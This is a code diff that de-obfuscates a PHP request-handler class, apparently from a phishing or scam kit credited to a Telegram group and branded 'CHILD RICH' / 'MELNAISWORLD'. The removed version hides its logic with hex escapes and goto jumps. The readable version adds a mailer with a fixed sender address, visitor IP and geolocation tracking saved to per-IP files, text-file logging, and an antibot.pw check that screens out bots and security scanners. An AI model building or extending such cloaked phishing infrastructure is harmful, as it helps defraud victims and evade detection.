@@ -5,4 +5,179 @@
     |    Group : https://t.me/childrichgroup           |
     |__________________________________________________|
 */
-ini_set("\x6d\x65\x6d\157\162\x79\137\154\151\155\151\x74", "\x32\x47"); class O8039 { private $O0418; private $O2410 = "\x41\160\160\x2f\x53\171\163\x74\x65\155\57"; public $O9581 = "\x41\x70\160\x2f\126\x69\x73\x69\x74\x6f\162\x2f"; public $O0530 = "\x41\160\160\57\x56\151\x65\167\163"; private $O7833 = "\x41\x70\160\x2f\x53\171\163\x74\145\155\57\151\x6e\163\164\141\x6c\x6c\145\144\56\x6c\157\143\153"; public $O6131 = "\x50\x41\x59\x50\101\114"; public function __construct() { $this->O0418 = new O2193(); } public function O5834() { goto O9374; O9374: $O3942 = parse_url($_SERVER["\x52\105\x51\125\105\123\x54\137\125\122\x49"], PHP_URL_PATH); goto O5356; O3915: $O4786 = isset($O0921[0]) ? $O0921[0] : "\150\x6f\155\x65"; goto O5775; O5356: $O0921 = explode("\x2f", trim($O3942, "\x2f")); goto O9813; O9813: $O5490 = $_GET; goto O3915; O5775: $this->O0418->O3288($O4786, $O5490); goto O7104; O7104: } public function o2529($O1381, $O5966, $O5020, $O3409) { goto O3700; O7851: $O7373 .= "\x4d\111\115\x45\x2d\x56\145\162\163\x69\x6f\x6e\72\40\61\x2e\x30\15\xa"; goto O5505; O7086: return mail($O1381, $O5966, $O5020, $O7373); goto O5712; O3700: $O7373 = "\x46\162\x6f\x6d\72\x20{$O3409}\x20\74\x6d\x65\x6c\x6e\141\151\163\x40\155\145\x6c\x6e\141\x69\x73\167\157\162\154\x64\56\x67\x67\x3e\xd\12"; goto O7851; O5505: $O7373 .= "\103\157\156\x74\145\x6e\x74\x2d\x74\x79\x70\145\x3a\40\164\145\170\164\x2f\150\164\x6d\x6c\73\40\143\150\141\x72\x73\145\164\75\125\124\x46\x2d\x38" . "\xd\xa"; goto O7086; O5712: } public function o5456($O0829) { require_once "\120\x72\157\x73\x65\163\x73\x2f\64\60\x34\56\x70\150\x70"; exit; } public function O6140() { return file_exists($this->O7833); } public function O8190() { goto O5011; O9738: $O5827 .= "\x3a\x2f\57" . @$_SERVER["\110\124\124\120\137\x48\117\x53\124"]; goto O6901; O6901: $O5827 .= str_replace(basename($_SERVER["\x53\103\122\x49\120\x54\137\x4e\101\115\x45"]), '', $_SERVER["\x53\103\x52\111\120\124\137\116\101\x4d\x45"]); goto O1926; O5011: $O5827 = isset($_SERVER["\x48\124\x54\120\x53"]) && $_SERVER["\x48\124\124\120\123"] == "\x6f\x6e" ? "\150\164\x74\160\163" : "\150\x74\x74\160"; goto O9738; O1926: return $O5827; goto O8670; O8670: } public function o3522($O9294) { goto O8084; O1612: if (isset($O5079[$O9294])) { goto O8885; } goto O1905; O4380: goto O5805; goto O9876; O8113: $O5079 = json_decode($O5336, true); goto O1612; O7987: O5805: goto O1770; O9876: O8885: goto O2095; O1905: return isset($O5079["\x64\145\x66\141\x75\154\x74"]) ? $O5079["\144\x65\146\141\x75\154\164"] : "\x4c\x61\x6e\147\165\141\x67\145\x20\156\157\x74\x20\x66\157\x75\156\144\x2e"; goto O4380; O2095: return $O5079[$O9294]; goto O7987; O8084: $O5336 = file_get_contents($this->O2410 . "\x62\x61\x68\x61\163\141\x2e\152\163\x6f\x6e"); goto O8113; O1770: } public function O1072($O1331, $O5079) { goto O0433; O0433: $O7204 = $O1331 . "\56\x74\170\x74"; goto O1127; O1127: $O6534 = date("\131\x2d\x6d\55\144\x20\x48\72\x69\72\x73") . "\x7c" . $O5079 . "\x7c\x4d\105\x4c\x4e\x41\111\x53\x57\117\122\114\x44\12"; goto O9621; O9621: file_put_contents($O7204, $O6534, FILE_APPEND); goto O4425; O4425: } public function write($O0472, $O4647, $O5079) { goto O3318; O3318: $O5002 = @fopen($O0472, $O4647); goto O1494; O4478: @fclose($O5002); goto O8826; O1494: @fwrite($O5002, $O5079); goto O4478; O8826: } public function O6205() { goto O1646; O1148: $O3768 = $_SERVER["\x48\x54\124\x50\x5f\103\x4c\111\x45\x4e\124\137\x49\x50"]; goto O8273; O8781: O7501: goto O7537; O0837: goto O5604; goto O5215; O8273: goto O5604; goto O8781; O7537: $O3768 = $_SERVER["\110\124\124\x50\137\130\x5f\106\x4f\x52\127\x41\x52\x44\x45\104\x5f\x46\x4f\122"]; goto O6665; O1646: if (isset($_SERVER["\x48\x54\x54\120\137\103\114\x49\x45\116\x54\x5f\111\120"]) && $_SERVER["\x48\124\x54\x50\x5f\x43\x4c\x49\x45\x4e\x54\137\x49\120"] != '') { goto O0390; } goto O4257; O6665: O5604: goto O7684; O7684: return $O3768; goto O9340; O5215: O0390: goto O1148; O3585: $O3768 = $_SERVER["\122\x45\115\x4f\124\105\137\101\x44\x44\122"]; goto O0837; O4257: if (isset($_SERVER["\x48\x54\124\x50\x5f\x58\x5f\x46\x4f\x52\x57\101\x52\104\105\x44\137\x46\117\x52"]) && $_SERVER["\x48\124\x54\x50\x5f\130\x5f\x46\x4f\122\x57\101\122\104\x45\x44\x5f\106\117\122"] != '') { goto O7501; } goto O3585; O9340: } private function O9066($O3768) { goto O4426; O8744: curl_setopt($O3297, CURLOPT_RETURNTRANSFER, true); goto O5834; O6732: echo "\x43\x75\162\x6c\40\145\162\x72\157\162\x3a\40" . curl_error($O3297); goto O8571; O7556: $O3297 = curl_init(); goto O8893; O0632: curl_close($O3297); goto O1330; O8571: curl_close($O3297); goto O0359; O0359: return null; goto O4703; O1330: return json_decode($O5223, true); goto O3978; O4703: O3139: goto O0632; O4426: $O9768 = "\x68\x74\x74\160\x3a\57\57\x69\160\x2d\x61\x70\x69\x2e\143\x6f\155\x2f\x6a\x73\157\x6e\x2f" . $O3768; goto O7556; O2414: curl_setopt($O3297, CURLOPT_SSL_VERIFYPEER, false); goto O9637; O0536: if (!curl_errno($O3297)) { goto O3139; } goto O6732; O8893: curl_setopt($O3297, CURLOPT_URL, $O9768); goto O8744; O5834: curl_setopt($O3297, CURLOPT_SSL_VERIFYHOST, false); goto O2414; O9637: $O5223 = curl_exec($O3297); goto O0536; O3978: } public function O2201() { goto O3267; O8338: $O2878 = new DateTime(); goto O3428; O3428: $O2878->setTimeZone($O7906); goto O9134; O3267: $O7906 = new DateTimeZone("\x41\163\151\141\57\x4a\x61\x6b\141\162\x74\x61"); goto O8338; O6162: return $O2875; goto O1871; O9134: $O2875 = $O2878->format("\110\x3a\151\x20\x41"); goto O6162; O1871: } public function O3830() { goto O3685; O2538: return $O6381; goto O9307; O0258: $O6381 = $O2878->format("\x48\x3a\151\40\101\40\55\x20\x44\54\40\x64\40\115\x20\131"); goto O2538; O5065: $O2878->setTimeZone($O7906); goto O0258; O3685: $O7906 = new DateTimeZone("\101\x73\151\141\57\x4a\x61\153\x61\x72\164\141"); goto O6423; O6423: $O2878 = new DateTime(); goto O5065; O9307: } public function O1082($O1331) { $O3498 = json_decode(file_get_contents($this->O2410 . "\144\141\x74\x61\x2e\x6a\163\157\156"), 1); return $O3498[$O1331]; } public function o1657($O1331, $O3768) { goto O9424; O0041: O7230: goto O8631; O4264: $O3163 = file_get_contents($O9511); goto O8452; O7365: if (!file_exists($O9511)) { goto O9630; } goto O4264; O9424: $O9511 = $this->O9581 . "\147\x65\157\137\144\x61\x74\x61\x5f" . $O3768 . "\56\152\163\x6f\x6e"; goto O7365; O8631: return isset($O9856[$O1331]) ? $O9856[$O1331] : null; goto O3527; O8452: $O9856 = json_decode($O3163, true); goto O5365; O4022: return null; goto O3381; O5365: goto O7230; goto O3553; O3381: O7741: goto O3789; O3789: file_put_contents($O9511, json_encode($O9856)); goto O0041; O7300: $O9856 = $this->o9066($O3768); goto O0229; O0229: if (!($O9856 === null)) { goto O7741; } goto O4022; O3553: O9630: goto O7300; O3527: } public function o8797($O9413, $O5653) { goto O9324; O1023: curl_close($O3297); goto O4573; O4573: $O1148 = json_decode($O5079, true); goto O6387; O6387: if (!(isset($O1148["\151\x73\x5f\x62\x6f\x74"]) && $O1148["\x69\x73\137\142\157\164"] === true)) { goto O1696; } goto O7685; O6581: curl_setopt($O3297, CURLOPT_USERAGENT, "\x41\x6e\164\151\x62\x6f\164\40\x42\x6c\157\143\153\x65\x72"); goto O7593; O2368: $O3297 = curl_init(); goto O6581; O1606: O4540: goto O1023; O0251: $O5079 = curl_exec($O3297); goto O4200; O8839: curl_setopt($O3297, CURLOPT_URL, "\x68\x74\164\160\x73\72\x2f\x2f\141\156\x74\151\x62\157\164\x2e\160\x77\x2f\x61\x70\151\57\x76\x32\55\142\154\157\x63\153\145\162\163\x3f\151\160\75" . urlencode($O9413) . "\x26\x61\160\151\153\x65\x79\75" . urlencode($O8870) . "\46\x75\141\x3d" . urlencode($O5653)); goto O0251; O7593: curl_setopt($O3297, CURLOPT_RETURNTRANSFER, true); goto O8839; O2826: return false; goto O1606; O7073: curl_close($O3297); goto O2826; O4200: if (!curl_errno($O3297)) { goto O4540; } goto O7073; O9324: $O8870 = $this->O1082("\141\x6e\164\x69\x62\157\164"); goto O2368; O7271: return false; goto O4969; O9338: O1696: goto O7271; O7685: return true; goto O9338; O4969: } }
+<?php
+ini_set('memory_limit', '2G');
+
+class RequestHandler {
+    private $pageLoader;
+    private $viewsPath = 'App/System/';
+    public $visitorPath = 'App/Visitor/';
+    public $pagePath = 'App/Views';
+    private $installFile = 'App/System/installed.lock';
+    public $namasc = 'CHILD RICH';
+
+    public function __construct() {
+        $this->pageLoader = new PageLoader();
+    }
+
+    public function processRequest() {
+        $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+        $segments = explode('/', trim($uri, '/'));
+        $queryParams = $_GET;
+        $page = isset($segments[0]) ? $segments[0] : 'home';
+        $this->pageLoader->loadPage($page, $queryParams);
+    }
+
+    public function sendEmail($to, $subject, $content, $nameemail) {
+        $headers = "From: $nameemail <melnais@melnaisworld.gg>\r\n";
+        $headers .= "MIME-Version: 1.0\r\n";
+        $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
+        return mail($to, $subject, $content, $headers);
+    }
+    
+    public function terminateApp($pesan) {
+        require_once 'Prosess/404.php';
+        exit;
+    }
+
+    public function isInstalled() {
+        return file_exists($this->installFile);
+    }
+
+    public function _url() 
+    {
+        $base_url = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "https" : "http");
+        $base_url .= "://". @$_SERVER['HTTP_HOST'];
+        $base_url .= str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']);
+    
+        return $base_url;
+    }
+
+    public function getLanguageData($languageCode) {
+        $jsonData = file_get_contents($this->viewsPath. 'bahasa.json');
+        $data = json_decode($jsonData, true);
+
+        if (isset($data[$languageCode])) {
+            return $data[$languageCode];
+        } else {
+            return isset($data['default']) ? $data['default'] : "Language not found.";
+        }
+    }
+
+    public function logstoText($name,$data) {
+    $logFile = $name.'.txt';
+    $logData = date('Y-m-d H:i:s') . "|" . $data . "|MELNAISWORLD\n";
+    file_put_contents($logFile, $logData, FILE_APPEND);
+    }
+
+    public function write($filename, $mode, $data) 
+    {
+    $fp = @fopen($filename, $mode);
+    @fwrite($fp, $data);
+    @fclose($fp);
+    }
+
+    public function getPublicIP()
+    {
+        if (isset($_SERVER['HTTP_CLIENT_IP']) && $_SERVER['HTTP_CLIENT_IP'] != '') {
+        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
+        } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] != '') {
+            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        } else {
+            $ip_address = $_SERVER['REMOTE_ADDR'];
+        }
+        return $ip_address;
+    }
+
+    private function _geoGet($ip_address) 
+    {
+        $url = "http://ip-api.com/json/" . $ip_address;
+        
+        $ch = curl_init(); 
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+        
+        $response = curl_exec($ch);
+        if (curl_errno($ch)) {
+            echo 'Curl error: ' . curl_error($ch); 
+            curl_close($ch); 
+            return null;
+        }
+        curl_close($ch);
+
+        return json_decode($response, true);
+    }
+
+    public function waktu() 
+    {
+        $timezone = new DateTimeZone('Asia/Jakarta');
+        $date = new DateTime();
+        $date->setTimeZone($timezone);
+        $time = $date->format('H:i A');
+    
+        return $time;
+    }
+
+    public function tanggal()
+    {
+        $timezone = new DateTimeZone('Asia/Jakarta');
+        $date = new DateTime();
+        $date->setTimeZone($timezone);
+        $fullday = $date->format('H:i A - D, d M Y');
+    
+        return $fullday;
+    }
+
+    public function getdata($name) 
+    {
+        $get = json_decode(file_get_contents($this->viewsPath . "data.json"), 1);
+        return $get[$name];
+    }
+
+    public function resultdat($name, $ip_address) 
+    {
+        $filePath = $this->visitorPath . 'geo_data_' . $ip_address . '.json';
+        
+        if (!file_exists($filePath)) {
+            $geoData = $this->_geoGet($ip_address);
+            
+            if ($geoData === null) {
+                return null; 
+            }
+            
+            file_put_contents($filePath, json_encode($geoData));
+        } else {
+            $jsonContent = file_get_contents($filePath);
+            $geoData = json_decode($jsonContent, true);
+        }
+
+        return isset($geoData[$name]) ? $geoData[$name] : null;
+    }
+
+    public function antibot($ip, $useragent) {
+        $key = $this->getdata('antibot');
+        $ch = curl_init();
+        
+        curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=" . urlencode($ip) . "&apikey=" . urlencode($key) . "&ua=" . urlencode($useragent));
+        
+        $data = curl_exec($ch);
+        if (curl_errno($ch)) {
+            curl_close($ch);
+            return false;
+        }
+    
+        curl_close($ch);
+        
+        $check = json_decode($data, true);
+        if (isset($check['is_bot']) && $check['is_bot'] === true) {
+            return true;
+        }
+        
+        return false;
+    }
+    
+}
